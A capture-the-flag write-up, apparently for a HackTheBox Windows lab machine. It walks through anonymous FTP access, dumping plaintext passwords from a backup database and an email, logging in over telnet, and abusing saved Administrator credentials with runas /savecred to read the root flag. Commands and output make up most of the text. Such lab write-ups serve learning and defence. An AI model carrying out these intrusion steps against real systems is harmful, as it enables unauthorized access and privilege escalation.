@@ -1,0 +1,287 @@
+# Access
+
+This machine on Hackthebox is available for free so I decided to give this a try and this was really an easy one, the biggest problem I had was looking for windows commands.
+
+
+So we start with a simple nmap scan
+
+```
+➜ nmap -sV -A  10.10.10.98
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-05 23:34 IST
+Nmap scan report for 10.10.10.98
+Host is up (0.15s latency).
+Not shown: 997 filtered ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     Microsoft ftpd
+| ftp-syst:
+|_  SYST: Windows_NT
+23/tcp open  telnet?
+80/tcp open  http    Microsoft IIS httpd 7.5
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/7.5
+|_http-title: MegaCorp
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 193.48 seconds
+```
+
+
+The first thing that catched my attention was that the `FTP` server allows the `anonymous` login. So I have learned this with CTFs that an you can login t the ftp server with credentials anonymous - anonymous.
+
+But before that I decided to run dirb in tmux so I can find anything on the http side.
+
+So that's what we try:
+```
+➜ ftp 10.10.10.98
+Connected to 10.10.10.98.
+220 Microsoft FTP Service
+Name (10.10.10.98:mzfr): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password:
+230 User logged in.
+Remote system type is Windows_NT.
+ftp> dir
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+08-23-18  08:16PM       <DIR>          Backups
+08-24-18  09:00PM       <DIR>          Engineer
+226 Transfer complete.
+ftp>
+```
+
+After login in with `anonymous` and `anonymous` we start with looking around and see there are two directories. Let's get evrything we can get from these two directories.
+
+```
+ftp> cd Backups
+250 CWD command successful.
+ftp> dir
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+08-23-18  08:16PM              5652480 backup.mdb
+226 Transfer complete.
+ftp> get backup.mdb
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+WARNING! 28296 bare linefeeds received in ASCII mode
+File may not have transferred correctly.
+226 Transfer complete.
+5652480 bytes received in 37.9 seconds (146 kbytes/s)
+ftp> cd ..
+250 CWD command successful.
+ftp> cd Engineer
+250 CWD command successful.
+ftp> dir
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+08-24-18  12:16AM                10870 Access Control.zip
+226 Transfer complete.
+ftp> get Access\ Control.zip
+200 PORT command successful.
+150 Opening ASCII mode data connection.
+WARNING! 45 bare linefeeds received in ASCII mode
+File may not have transferred correctly.
+226 Transfer complete.
+10870 bytes received in 4.76 seconds (2.23 kbytes/s)
+```
+
+This way we can get the files that were present in those two directories.
+
+Now let's examine them since the zip file was password protected I decided to read the mdb file in hope of getting the password.
+
+```
+acc_antiback acc_door acc_firstopen acc_firstopen_emp acc_holidays acc_interlock acc_levelset acc_levelset_door_group acc_linkageio acc_map acc_mapdoorpos acc_morecardempgroup acc_morecardgroup acc_timeseg acc_wiegandfmt ACGroup acholiday ACTimeZones action_log AlarmLog areaadmin att_attreport att_waitforprocessdata attcalclog attexception AuditedExc auth_group_permissions auth_message auth_permission auth_user auth_user_groups auth_user_user_permissions base_additiondata base_appoption base_basecode base_datatranslation base_operatortemplate base_personaloption base_strresource base_strtranslation base_systemoption CHECKEXACT CHECKINOUT dbbackuplog DEPARTMENTS deptadmin DeptUsedSchs devcmds devcmds_bak django_content_type django_session EmOpLog empitemdefine EXCNOTES FaceTemp iclock_dstime iclock_oplog iclock_testdata iclock_testdata_admin_area iclock_testdata_admin_dept LeaveClass LeaveClass1 Machines NUM_RUN NUM_RUN_DEIL operatecmds personnel_area personnel_cardtype personnel_empchange personnel_leavelog ReportItem SchClass SECURITYDETAILS ServerLog SHIFT TBKEY TBSMSALLOT TBSMSINFO TEMPLATE USER_OF_RUN USER_SPEDAY UserACMachines UserACPrivilege USERINFO userinfo_attarea UsersMachines UserUpdates worktable_groupmsg worktable_instantmsg worktable_msgtype worktable_usrmsg ZKAttendanceMonthStatistics acc_levelset_emp acc_morecardset ACUnlockComb AttParam auth_group AUTHDEVICE base_option dbapp_viewmodel FingerVein devlog HOLIDAYS personnel_issuecard SystemLog USER_TEMP_SCH UserUsedSClasses acc_monitor_log OfflinePermitGroups OfflinePermitUsers OfflinePermitDoors LossCard TmpPermitGroups TmpPermitUsers TmpPermitDoors ParamSet acc_reader acc_auxiliary STD_WiegandFmt CustomReport ReportField BioTemplate FaceTempEx FingerVeinEx TEMPLATEEx
+```
+
+There were lots of autogenerated tables present but then I noticed the auth_* tables
+
+```
+# mdb-export Backups/backup.mdb auth_user
+id,username,password,Status,last_login,RoleID,Remark
+25,"admin","admin",1,"08/23/18 21:11:47",26,
+27,"engineer","access4u@security",1,"08/23/18 21:13:36",26,
+28,"backup_admin","admin",1,"08/23/18 21:14:02",26,
+```
+
+Now we have some password.
+
+At this point I checked my tmux that was running the dirb but unfortunately it didn't find anything interesting:
+```
+_ dirb http://10.10.10.98/
+
+-----------------
+DIRB v2.22
+By The Dark Raver
+-----------------
+
+START_TIME: Tue Mar  5 22:35:25 2019
+URL_BASE: http://10.10.10.98/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612
+
+---- Scanning URL: http://10.10.10.98/ ----
+==> DIRECTORY: http://10.10.10.98/aspnet_client/
++ http://10.10.10.98/index.html (CODE:200|SIZE:391)
+
+---- Entering directory: http://10.10.10.98/aspnet_client/ ----
+==> DIRECTORY: http://10.10.10.98/aspnet_client/system_web/
+
+---- Entering directory: http://10.10.10.98/aspnet_client/system_web/ ----
+
+-----------------
+END_TIME: Tue Mar  5 23:28:59 2019
+DOWNLOADED: 13836 - FOUND: 1
+```
+
+So I decided to stick with terminal.
+
+Remember we got a ZIP file from FTP server from `Engineer` directory and now we just got the password so using that password i.e `access4u@security`, I extracted the zip and got a `Access Control.pst` file. Since I am on linux I decided to use the online tool for this I converted the `.pst` to `.pdf` using this(https://www.pdfen.com/convert-to-pdf/pst-to-pdf) website.
+
+Following was the content of the pdf
+```
+From:                  john@megacorp.com <john@megacorp.com>
+To:                    'security@accesscontrolsystems.com' <security@accesscontrolsystems.com>
+Subject:               MegaCorp Access Control System "security" account
+Date:                  24.08.2018 01:44:07 (+0200)
+
+
+Hi there,
+
+The password for the “security” account has been changed to 4Cc3ssC0ntr0ller. Please ensure this is passed on to
+your engineers.
+
+Regards,
+John
+```
+
+Again a password.
+Since we are done with ftp I decided to try this credentials on telnet since that service was up.
+
+```
+➜ telnet --user=security 10.10.10.98
+Trying 10.10.10.98...
+Connected to 10.10.10.98.
+Escape character is '^]'.
+Welcome to Microsoft Telnet Service
+
+password:
+*===============================================================
+Microsoft Telnet Server.
+*===============================================================
+C:\Users\security>
+```
+
+Since we are in we first go for the `Own User` hash, which should be in /user/Desktop
+
+```
+C:\Users\security>cd Desktop
+
+C:\Users\security\Desktop>dir
+ Volume in drive C has no label.
+ Volume Serial Number is 9C45-DBF0
+
+ Directory of C:\Users\security\Desktop
+
+08/28/2018  06:51 AM    <DIR>          .
+08/28/2018  06:51 AM    <DIR>          ..
+08/21/2018  10:37 PM                32 user.txt
+               1 File(s)             32 bytes
+               2 Dir(s)  16,762,515,456 bytes free
+
+C:\Users\security\Desktop>type user.txt
+long-hash
+```
+
+Okay now we have the user hash we need to escalated the privilaege and get the Admin hash. I start looking around in different folders when I found something interesting
+
+```
+C:\Users>cd public
+
+C:\Users\Public>dir
+ Volume in drive C has no label.
+ Volume Serial Number is 9C45-DBF0
+
+ Directory of C:\Users\Public
+
+03/05/2019  06:26 PM    <DIR>          .
+03/05/2019  06:26 PM    <DIR>          ..
+07/14/2009  05:06 AM    <DIR>          Documents
+07/14/2009  04:57 AM    <DIR>          Downloads
+07/14/2009  04:57 AM    <DIR>          Music
+07/14/2009  04:57 AM    <DIR>          Pictures
+03/05/2019  06:26 PM            73,802 rev.exe
+07/14/2009  04:57 AM    <DIR>          Videos
+               1 File(s)         73,802 bytes
+               7 Dir(s)  16,762,437,632 bytes free
+
+C:\Users\Public>
+```
+
+The `Public` directory is missing multiple common/default directories
+
+```
+C:\Users\Public>dir /A
+ Volume in drive C has no label.
+ Volume Serial Number is 9C45-DBF0
+
+ Directory of C:\Users\Public
+
+03/05/2019  06:26 PM    <DIR>          .
+03/05/2019  06:26 PM    <DIR>          ..
+03/05/2019  06:00 PM    <DIR>          Desktop
+07/14/2009  04:57 AM               174 desktop.ini
+07/14/2009  05:06 AM    <DIR>          Documents
+07/14/2009  04:57 AM    <DIR>          Downloads
+07/14/2009  02:34 AM    <DIR>          Favorites
+07/14/2009  04:57 AM    <DIR>          Libraries
+07/14/2009  04:57 AM    <DIR>          Music
+07/14/2009  04:57 AM    <DIR>          Pictures
+03/05/2019  06:26 PM            73,802 rev.exe
+07/14/2009  04:57 AM    <DIR>          Videos
+               2 File(s)         73,976 bytes
+              10 Dir(s)  16,762,437,632 bytes free
+```
+
+This shows all the hidden file and there's an interesting file
+
+```
+C:\Users\Public\Desktop>dir
+ Volume in drive C has no label.
+ Volume Serial Number is 9C45-DBF0
+
+ Directory of C:\Users\Public\Desktop
+
+08/22/2018  09:18 PM             1,870 ZKAccess3.5 Security System.lnk
+               1 File(s)          1,870 bytes
+               0 Dir(s)  16,765,644,800 bytes free
+```
+
+There's a `.lnk` file
+
+```
+C:\Users\Public\Desktop>type "ZKAccess3.5 Security System.lnk"
+L�F�@ ��7���7���#�P/P�O� �:i�+00�/C:\R1M�:Windows���:�▒M�:*wWindowsV1MV�System32���:�▒MV�*�System32▒X2P�:�
+runas.exe���:1��:1�*Yrunas.exe▒L-K��E�C:\Windows\System32\runas.exe#..\..\..\Windows\System32\runas.exeC:\ZKTeco\ZKAccess3.5G/user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"'C:\ZKTeco\ZKAccess3.5\img\AccessNET.ico�%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico�%�
+�wN�▒�]N�D.��Q���`�Xaccess�_���8{E�3
+O�j)�H���
+  )ΰ[�_���8{E�3
+               O�j)�H���
+                        )ΰ[�        ��1SPS��XF�L8C���&�m�e*S-1-5-21-953262931-566350628-63446256-500
+```
+
+I found this command online but basically we are just reading that file we found.
+I can't completely understand this but it seems like it have control over admin So I tried the following:
+
+```
+C:\Users\Public\Desktop>runas /user:Administrator /savecred "cmd.exe /c more C:\Users\Administrator\Desktop\root.txt > C:\Users\Public\Desktop\output.txt"
+
+C:\Users\Public\Desktop>type output.txt
+long-hash
+```
+
+Boom PWNED!!
+
